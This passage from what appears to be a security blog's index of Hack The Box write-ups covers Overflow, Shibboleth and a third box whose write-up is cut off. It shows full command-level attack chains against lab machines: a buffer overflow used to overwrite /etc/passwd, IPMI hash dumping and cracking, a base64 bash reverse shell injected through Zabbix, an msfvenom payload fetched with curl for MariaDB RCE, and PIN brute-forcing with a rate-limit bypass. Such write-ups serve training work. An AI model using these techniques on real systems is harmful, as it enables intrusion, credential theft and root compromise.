aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x6161616c in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 44 (little-endian search) likely [+] Found at offset 41 (big-endian search)  And we see that the offset is 44, so we need 44 characters to overwrite the return address. Let\u0026rsquo;s test it:\ngef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x45444342 in ?? ()  And it shows that the next instruction is in address 0x45444342 (BCDE in little-endian), so we have control over $eip.\nIn Ghidra, we can find the code for the encrypt function, so it must have an address. Recall that ASLR is disabled and PIE has no effect, then the address of encrypt is static:\ngef➤ x encrypt 0x5655585b \u0026lt;encrypt\u0026gt;: 0x53e58955  And the address of encrypt is 0x5655585b. Curiously, these bytes are printable. In little-endian format, the address of encrypt is the same as [XUV:\n\u0026gt;\u0026gt;\u0026gt; '\\x5b\\x58\\x55\\x56' '[XUV'  So, we can put this address into $eip so that we call encrypt:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File:  At this point we have exploited the Buffer Overflow to call a function that was not in the main process.\nPrivilege escalation Let\u0026rsquo;s view the source code for encrypt in Ghidra:\nvoid encrypt(char *__block,int __edflag) { int iVar1; int *piVar2; char *pcVar3; undefined4 local_98 = 0; undefined4 local_94 = 0; undefined4 local_90 = 0; undefined4 local_8c = 0; undefined4 local_88 = 0; undefined4 local_84 = 0; undefined4 local_80 = 0; undefined4 local_7c = 0; undefined4 local_78 = 0; undefined4 local_74 = 0; stat local_70; uint local_18; FILE *local_14; FILE *local_10;  printf(\"Enter Input File: \"); __isoc99_scanf(\"%s\", \u0026amp;local_84); printf(\"Enter Encrypted File: \"); __isoc99_scanf(\"%s\", \u0026amp;local_98); iVar1 = stat((char *) \u0026amp;local_84, \u0026amp;local_70); if (iVar1 \u0026lt; 0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf(stderr, \"Failed to stat %s: %s\\n\", \u0026amp;local_84, pcVar3); /* WARNING: Subroutine does not return */ exit(1); } if (local_70.st_uid == 0) { fprintf(stderr, \"File %s is owned by root\\n\", \u0026amp;local_84); /* WARNING: Subroutine does not return */ exit(1); } sleep(3); local_10 = fopen((char *) \u0026amp;local_84, \"rb\"); if (local_10 == (FILE *) 0x0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf((FILE *) \"cannot open input file %s: %s\\n\", (char *) \u0026amp;local_84, pcVar3); } else { local_14 = fopen((char *) \u0026amp;local_98, \"wb\"); if (local_14 == (FILE *) 0x0) { piVar2 = __errno_location(); pcVar3 = strerror(*piVar2); fprintf((FILE *) \"cannot open output file %s: %s\\n\", (char *) \u0026amp;local_98, pcVar3); fclose(local_10); } else { while (true) { local_18 = _IO_getc(local_10); if (local_18 == 0xffffffff) break; _IO_putc(local_18 ^ 0x9b, local_14); } fclose(local_10); fclose(local_14); } } return; }  Basically, what it does is take a file, encrypt it and write the result into another file. Let\u0026rsquo;s try it:\ntester@overflow:~$ cd /tmp tester@overflow:/tmp$ mkdir .test tester@overflow:/tmp$ cd .test tester@overflow:/tmp/.test$ echo asdf  t tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/.test/t Enter Encrypted File: /tmp/.test/t_enc Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 8 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 root tester 5 t_enc tester@overflow:/tmp/.test$ xxd t 00000000: 6173 6466 0a asdf. tester@overflow:/tmp/.test$ xxd t_enc 00000000: fae8 fffd 91 .....  And the program wrote the file t_enc, which is owned by root.\nIn the decompiled source code, we discover that the encryption method is XOR byte-wise with a key of 0x9b:\nwhile (true) { local_18 = _IO_getc(local_10); if (local_18 == 0xffffffff) break; _IO_putc(local_18 ^ 0x9b, local_14); }  To decrypt the file, we just can XOR byte-wise with the same key 0x9b. Namely, we take the hexdump of file t_enc and do the XOR operation with the key:\n\u0026gt;\u0026gt;\u0026gt; hex(0xfae8fffd91 ^ 0x9b9b9b9b9b) '0x617364660a'  And we get asdf (in hexadecimal) that is the contents file called t.\nThere is a validation on the file we want to encrypt: it must not be owned by root. However, there is no validation on the output file, so we have write permissions as root.\nHaving write permissions as root allows us to add a public SSH key into /root/.ssh/authorized_keys or overwrite /etc/passwd to specify a certain password for root in DES Unix format. This time we will carry out the second approach.\nNotice this:\ntester@overflow:/tmp/.test$ cp t_enc t2 tester@overflow:/tmp/.test$ ls -l --time-style=+ total 12 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t_enc tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/.test/t2 Enter Encrypted File: /tmp/.test/t2_enc Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 16 -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t_enc -rw-rw-r-- 1 root tester 5 t2_enc tester@overflow:/tmp/.test$ cat t2_enc asdf  We have encrypted the already encrypted file (t2 is a copy of t_enc, but belonging to tester and not root), and the output of the double-encrypted file is the same as the original file t (that was asdf). So that is the trick, we must write a file, encrypt it, copy it and encrypt it again. The output of the second encryption will be in plain text.\nLet\u0026rsquo;s modify a copy of /etc/passwd using sed:\ntester@overflow:/tmp/.test$ which openssl /usr/bin/openssl tester@overflow:/tmp/.test$ openssl passwd 7rocky OO3PvAT9Z8SvU tester@overflow:/tmp/.test$ cp /etc/passwd p1 tester@overflow:/tmp/.test$ head -1 p1 root:x:0:0:root:/root:/bin/bash tester@overflow:/tmp/.test$ sed -i 's/root:x/root:OO3PvAT9Z8SvU/' p1 tester@overflow:/tmp/.test$ head -1 p1 root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash  We have changed the x for OO3PvAT9Z8SvU. This will provoke that su root compares the password inserted in DES Unix format with OO3PvAT9Z8SvU, and not with the hash inside /etc/shadow.\nLet\u0026rsquo;s encrypt p1 for the first time:\ntester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: p1 Enter Encrypted File: p1_enc Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 24 -rw-r--r-- 1 tester tester 1735 p1 -rw-rw-r-- 1 tester tester 1735 p1_enc -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t2_enc -rw-rw-r-- 1 root tester 5 t_enc  Now we create a copy of p1_enc as p2 end encrypt it. The output will be written to /etc/passwd:\ntester@overflow:/tmp/.test$ cp p1_enc p2 tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: p2 Enter Encrypted File: /etc/passwd Segmentation fault (core dumped) tester@overflow:/tmp/.test$ head -1 /etc/passwd root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash  And we have successfully overwritten /etc/passwd. We are able to login as root with password 7rocky:\ntester@overflow:/tmp/.test$ su root Password: root@overflow:/tmp/.test# cat /root/root.txt b3ae2337f9ea07d8a4c9b8613ad860a0  ","image":"/images/HTB/Overflow/Overflow.png","permalink":"https://7rocky.github.io/en/htb/overflow/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi","time":26,"title":"Overflow"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.124   Release: 13 / 11 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.124 -p 80 Nmap scan report for 10.10.11.124 Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-title: FlexStart Bootstrap Template - Index |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.04 seconds  This machine has port 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.124, the server will redirect to http://shibboleth.htb. After setting the domain in /etc/hosts we can access and view this site:\nWe can apply som fuzzing with ffuf to enumerate some routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://shibboleth.htb/FUZZ -e .php,.html index.html [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 109ms] blog.html [Status: 200, Size: 19196, Words: 5073, Lines: 426, Duration: 130ms] assets [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 107ms] forms [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 123ms] .html [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms] .php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms] [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 97ms] server-status [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 88ms]  And also some subdomains:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.124 -H 'Host: FUZZ.shibboleth.htb' -fc 302 monitor [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 121ms] monitoring [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 107ms] zabbix [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 457ms]  All subdomains are the same website, a Zabbix login form:\nBut we can\u0026rsquo;t do anything here yet, since we do not have credentials and there is no clear vulnerability.\nUDP enumeration At this point, we don\u0026rsquo;t have anymore to investigate, so let\u0026rsquo;s run a UDP port scan:\n# nmap -sU --top-ports 100 -n -Pn -vv 10.10.11.124 Password: Starting Nmap 7.92 ( https://nmap.org ) Initiating UDP Scan Scanning 10.10.11.124 [100 ports] Increasing send delay for 10.10.11.124 from 0 to 50 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.124 from 50 to 100 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.124 from 100 to 200 due to max_successful_tryno increase to 6 Increasing send delay for 10.10.11.124 from 200 to 400 due to 11 out of 12 dropped probes since last increase. Increasing send delay for 10.10.11.124 from 400 to 800 due to 11 out of 11 dropped probes since last increase. Discovered open port 623/udp on 10.10.11.124 Completed UDP Scan, 102.42s elapsed (100 total ports) Nmap scan report for 10.10.11.124 Host is up, received user-set (0.096s latency). Scannedfor 102s Not shown: 98 closed udp ports (port-unreach) PORT STATE SERVICE REASON 138/udp open|filtered netbios-dgm no-response 623/udp open asf-rmcp udp-response ttl 63 Nmap done: 1 IP address (1 host up) scanned in 102.46 seconds Raw packets sent: 246 (13.189KB) | Rcvd: 110 (9.315KB)  And we discover that port 623 (UDP) is open, which stands for IPMI.\nIPMI exploitation HackTricks has some information regarding this service. Most of the recognising and exploitation techniques are covered by Metasploit Framework, so let\u0026rsquo;s start.\nFirst, we will check the version of IPMI:\n$ msfconsole -q msf6 \u0026gt; use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; set RHOSTS 10.10.11.124 RHOSTS =\u0026gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; run [*] Sending IPMI requests to 10.10.11.124-\u0026gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  There is an exploit for IPMI that allows us to dump password hashes for common usernames:\nmsf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; set RHOSTS 10.10.11.124 RHOSTS =\u0026gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; set OUTPUT_JOHN_FILE ./hash OUTPUT_JOHN_FILE =\u0026gt; ./hash msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:0e60be0702060000aca06cad807b13048ed6f894c5c144e3345d9d440c8d5575c76919f4198e2e1ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:27d7c9a280380fba72efc55babb4fdf216fdfc87 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  And there we have it, now we can crack the hash with john and rockyou.txt:\n$ cat hash 10.10.11.124 Administrator:$rakp$3aab2bf5020a000061799fc2151cd71322e3e5a0bd03da5efae02e1e1f6524e75b9ecc9dca02d6a4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$81a9602adaa1d61f8c24cfbf1ef0c03df095b945 $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 ASIMD 4x]) Press 'q' or Ctrl-C to abort, almost any other key for status ilovepumkinpie1 (10.10.11.124 Administrator) 1g 0:00:00:01 DONE 0.5154g/s 3812Kp/s 3812Kc/s 3812KC/s iloveqmc..ilovepatri Use the \"--show\" option to display all of the cracked passwords reliably Session completed.  And there\u0026rsquo;s the password.\nFoothold on the machine Now we can access Zabbix using credentials Administrator:ilovepumkinpie1:\nThe way to exploit Zabbix is to create a new item (going to \u0026ldquo;Configuration\u0026rdquo;, selecting \u0026ldquo;Hosts\u0026rdquo; and clicking in \u0026ldquo;Create item\u0026rdquo;).\nThere, we will see a form like the one below, and we must enter a name and a key, where we will put a command that will be executed every minute. For instance, a reverse shell:\nsystem.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash,nowait]  $ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  And we will see that the item is created:\nNow we must wait some seconds until the connection hits nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.124. Ncat: Connection from 10.10.11.124:44284. bash: cannot set terminal process group (859): Inappropriate ioctl for device bash: no job control in this shell zabbix@shibboleth:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null zabbix@shibboleth:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm zabbix@shibboleth:/$ export TERM=xterm zabbix@shibboleth:/$ export SHELL=bash zabbix@shibboleth:/$ stty rows 50 columns 158  System enumeration We see that there is a user called ipmi-svc and that it owns the user.txt flag:\nzabbix@shibboleth:/$ ls /home ipmi-svc zabbix@shibboleth:/$ find / -name user.txt 2/dev/null /home/ipmi-svc/user.txt zabbix@shibboleth:/$ cat /home/ipmi-svc/user.txt cat: /home/ipmi-svc/user.txt: Permission denied  We can switch to that user reusing the password found before (ilovepumkinpie1):\nzabbix@shibboleth:/$ su ipmi-svc Password: ipmi-svc@shibboleth:/$ cd ipmi-svc@shibboleth:~$ cat user.txt bc3f4542527b43d71e100c426b445674  Its home directory shows a .mysql_history file, that is not commonly seen in other boxes:\nipmi-svc@shibboleth:~$ ls -la total 32 drwxr-xr-x 3 ipmi-svc ipmi-svc 4096 Oct 16 12:23 . drwxr-xr-x 3 root root 4096 Oct 16 12:24 .. lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 27 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 220 Apr 24 2021 .bash_logout -rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24 2021 .bashrc drwx------ 2 ipmi-svc ipmi-svc 4096 Apr 27 2021 .cache lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 28 2021 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 807 Apr 24 2021 .profile -rw-r----- 1 ipmi-svc ipmi-svc 33 Apr 13 05:29 user.txt -rw-rw-r-- 1 ipmi-svc ipmi-svc 22 Apr 24 2021 .vimrc  This is the version of MySQL (MariaDB):\nipmi-svc@shibboleth:~$ mysql --version mysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2  Privilege escalation If we do a bit of research, we will find CVE-2021-27928, which leads to Remote Code Execution (RCE) as root because we can set a malicious shared library to be used by MariaDB.\nTo exploit MariaDB we need a valid user. We can search for configuration files that Zabbix needs:\nipmi-svc@shibboleth:~$ find / -name zabbix\\* -type f 2/dev/null | grep -v sys /var/lib/dpkg/info/zabbix-frontend-php.md5sums /var/lib/dpkg/info/zabbix-agent.md5sums /var/lib/dpkg/info/zabbix-agent.postrm /var/lib/dpkg/info/zabbix-release.md5sums /var/lib/dpkg/info/zabbix-release.conffiles /var/lib/dpkg/info/zabbix-server-mysql.list /var/lib/dpkg/info/zabbix-sender.md5sums /var/lib/dpkg/info/zabbix-server-mysql.postrm /var/lib/dpkg/info/zabbix-release.list /var/lib/dpkg/info/zabbix-agent.prerm /var/lib/dpkg/info/zabbix-agent.conffiles /var/lib/dpkg/info/zabbix-agent.postinst /var/lib/dpkg/info/zabbix-server-mysql.postinst /var/lib/dpkg/info/zabbix-get.list /var/lib/dpkg/info/zabbix-sender.list /var/lib/dpkg/info/zabbix-frontend-php.list /var/lib/dpkg/info/zabbix-agent.list /var/lib/dpkg/info/zabbix-get.md5sums /var/lib/dpkg/info/zabbix-frontend-php.prerm /var/lib/dpkg/info/zabbix-server-mysql.md5sums /var/lib/dpkg/info/zabbix-frontend-php.postinst /var/lib/dpkg/info/zabbix-server-mysql.conffiles /var/lib/dpkg/info/zabbix-frontend-php.postrm /var/lib/dpkg/alternatives/zabbix-frontend-font /var/log/zabbix/zabbix_agentd.log.1 /var/log/zabbix/zabbix_agentd.log /var/log/zabbix/zabbix_server.log /var/log/zabbix/zabbix_server.log.1 /run/zabbix/zabbix_server.pid /run/zabbix/zabbix_agentd.pid /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_server.conf.dpkg-dist /etc/zabbix/zabbix_server.conf /etc/zabbix/web/zabbix.conf.php /etc/zabbix/zabbix_agentd.conf.dpkg-dist /etc/logrotate.d/zabbix-server-mysql /etc/logrotate.d/zabbix-agent /etc/apt/trusted.gpg.d/zabbix-official-repo.gpg /etc/apt/sources.list.d/zabbix.list /etc/init.d/zabbix-agent /etc/init.d/zabbix-server /usr/bin/zabbix_sender /usr/bin/zabbix_get /usr/share/zabbix/zabbix.php /usr/share/zabbix/conf/zabbix.conf.php.example /usr/share/man/man8/zabbix_server.8.gz /usr/share/man/man8/zabbix_agentd.8.gz /usr/share/man/man1/zabbix_sender.1.gz /usr/share/man/man1/zabbix_get.1.gz /usr/lib/tmpfiles.d/zabbix-server.conf /usr/lib/tmpfiles.d/zabbix-agent.conf /usr/sbin/zabbix_agentd /usr/sbin/zabbix_server  There is one called /etc/zabbix/zabbix_server.conf that seems interesting. In fact, it contains the credentials we are looking for:\nipmi-svc@shibboleth:~$ grep -iC 2 password /etc/zabbix/zabbix_server.conf DBUser=zabbix ### Option: DBPassword # Database password. # Comment this line if no password is used. # # Mandatory: no # Default: DBPassword=bloooarskybluh ### Option: DBSocket  At this point, we can enter MySQL:\nipmi-svc@shibboleth:~$ mysql --user=zabbix --password=bloooarskybluh Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2121 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)] exit Bye  But we want to get a root shell. For that, we need to generate a payload for a reverse shell in an ELF shared library format and upload it to the machine:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=5555 -f elf-so -o rev.so [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: rev.so  ipmi-svc@shibboleth:~$ cd /tmp ipmi-svc@shibboleth:/tmp$ curl 10.10.17.44/rev.so -so rev.so  $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.124 - - [] \"GET /rev.so HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  Then, we can use it to gain RCE:\nipmi-svc@shibboleth:/tmp$ mysql --user=zabbix --password=bloooarskybluh --execute='SET GLOBAL wsrep_provider=\"/tmp/rev.so\";' ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query  And we get the connection in nc:\n$ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.11.124. Ncat: Connection from 10.10.11.124:38120. whoami root script /dev/null -c bash Script started, file is /dev/null root@shibboleth:/var/lib/mysql# ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 reset xterm root@shibboleth:/var/lib/mysql# export TERM=xterm root@shibboleth:/var/lib/mysql# export SHELL=bash root@shibboleth:/var/lib/mysql# stty rows 50 columns 158 root@shibboleth:/var/lib/mysql# cat /root/root.txt 59607b79a008a6d32f911ad9b1461d57 root@shibboleth:/var/lib/mysql#  ","image":"/images/HTB/Shibboleth/Shibboleth.png","permalink":"https://7rocky.github.io/en/htb/shibboleth/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine","time":8,"title":"Shibboleth"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.11.159   Release: 30 / 03 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.159 Nmap scan report for 10.10.11.159 Host is up (0.077s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: UHC March Finals |_Requested resource was http://10.10.11.159/login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.81 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.159, we will see a login form:\nWe can poke around a little bit and find out that it is vulnerable to user enumeration. There are two different responses if the username is valid or not:\nMoreover, we can check that admin is a valid username. There is also a page to request a password reset:\nIf we enter admin as username, we will be asked for a 4-digit PIN:\nWe can try 1234 as the form suggests, but it is invalid:\nFoothold The error message is interesting because it says to use the same browser. Maybe the PIN can be obtained using brute force. Let\u0026rsquo;s try using a for-loop in Bash:\n$ cookie='laravel_session=eyJpdiI6IlNyK1R6MU83L010Y1E0YVI2NDdvUlE9PSIsInZhbHVlIjoiYlRWZ1BTZVJsVzNQamwxUitNOS9sN1lrQTNncnNqWHA5OUcycFFFSDFXaXp0ZlRFeFRDNWhLaFBxR2g3Q3BLQ3RiSHNEUDNlRjdZemxPeXl5NGx5ZXpLc0RlaUhLSm16RTZkRVViZDFVeTJ1UWRjY3U4RW9GTjc3eFJvYWcyTU8iLCJtYWMiOiI3OWRkNmM0Y2EwYjVkY2I2ODRjMDE5MTJmOGUyMDA0NDlmMzFkYmU5YWVlODM2MzU2ZmUzYTliZWQzNDY1OTc5IiwidGFnIjoiIn0%3D' $ for pin in {0000..9999}; do (echo -n \"$pin: \"; curl 10.10.11.159/api/resettoken -sid \"name=admin\u0026pin=$pin\" -H \"Cookie: $cookie\") | grep '429 Too Many Requests'; done 0060: HTTP/1.1 429 Too Many Requests 0061: HTTP/1.1 429 Too Many Requests 0062: HTTP/1.1 429 Too Many Requests 0063: HTTP/1.1 429 Too Many Requests ^C  The server has a rate limit of 60 requests per minute (1 request per second). At this rate, the complete brute force attack could take nearly 3 hours, which is a lot. Thus we must find a way to bypass the rate limit.\nBrute force attack There are some headers that can affect the rate limit (HackTricks). The one that is useful for the current situation is X-Forwarded-For using a random IP address.\nAt this point, I developed a Ruby script called bf_pin.rb that performs the brute force attack using threads, so that the PIN is obtained in around three minutes (detailed explanation here)):\n$ ruby bf_pin.rb [*] Using cookie: XSRF-TOKEN=eyJpdiI6IkppemJMM2ozV01TeE5JbXFIbFBNc1E9PSIsInZhbHVlIjoiNks0K244K3Z1WU1HYVZjM3FsYjE5S05jMk8vejg0RUs0QjVRYkVrRFFMNjRKTE0xVUdYYUhJbyt3SkkwSU5lVVFyK1h5VmxlQUZqRjhsM1diMTRwbitmUm5PYUozN2M5VWRVRGtnWEZyd0FzUmZMTXhTbC80RWIzbmd6M1o4N04iLCJtYWMiOiJiMGQ3MGQ2YTc0ZmNkNzk4NzM1OWUzNTZhMmJjM2JiNzgxMmRmYWZjMjRmOTI2MDJkMDUwYWZiNWY1M2Q0MGJjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZSOGdLVmdZd1J6ZVJabklBNFRmdUE9PSIsInZhbHVlIjoiaCtXaFpHcDlsaXFBN05Ea2ZvYjYrdUZtZWluUmhVM3BjaWl2TXhXVmpTZXlSYTkybXZUNTd2YkQzNzNIc0FxYlV3b2l3Q1d1dml5SFd4QzlWUFlYY0JLb3NLVE4yaHZ1N0FGZkpEUTYzdzdnRzl5TWpGeGgwaCs0S29pQVRUREEiLCJtYWMiOiIxNTNiYmZjYTVjYThlN2QwMTQ1MzU1OWNlNmJiYjNjMzUwNzYwNjgzOGVhZDdlZjg5NzdlODY5OGM0ZDdiNzBkIiwidGFnIjoiIn0%3D [*] Trying from 7400 to 7600... [+] 7409 is valid  Now, we must take the cookies and set them in the browser so that we keep the same session. Then we can enter 7409 and introduce a new password for admin:\nAnd we can login successfully. We arrive to a list of users:\nFinding SQLi The only functionality here is the \u0026ldquo;View\u0026rdquo; link, which shows a different message for each user:\nThe page is not refreshing, so the data is comming via AJAX. If we check the sources, we will find a script tag holding some JavaScript code and a function called getBio:\nfunction getBio(id, secret) { $.ajax({ type: 'GET', url: 'api/getprofile', data: { id: id, secret: secret }, success: function (data) { document.getElementById('alert').style.visibility = 'visible' document.getElementById('alert').innerHTML = data } }) }  It is making a GET request to retrieve the data. Looking to the HTML code, each link has a onclick event that executes this function with a number as id and an MD5 hash as secret. Let\u0026rsquo;s try it with curl:\n$ curl '10.10.11.159/api/getprofile?id=6\u0026secret=7a5cd01cdb222330a1ec68b439887ea1' Watchdog is an enthusiast hacker and developer from England.  It works. However, if we try to modify the id or the secret, we get caught:\n$ curl '10.10.11.159/api/getprofile?id=6\u0026secret=asdf' Tampered user input detected $ curl '10.10.11.159/api/getprofile?id=1\u0026secret=7a5cd01cdb222330a1ec68b439887ea1' Tampered user input detected  It seems that the server is validating the integrity of the query. And it does not seem to be 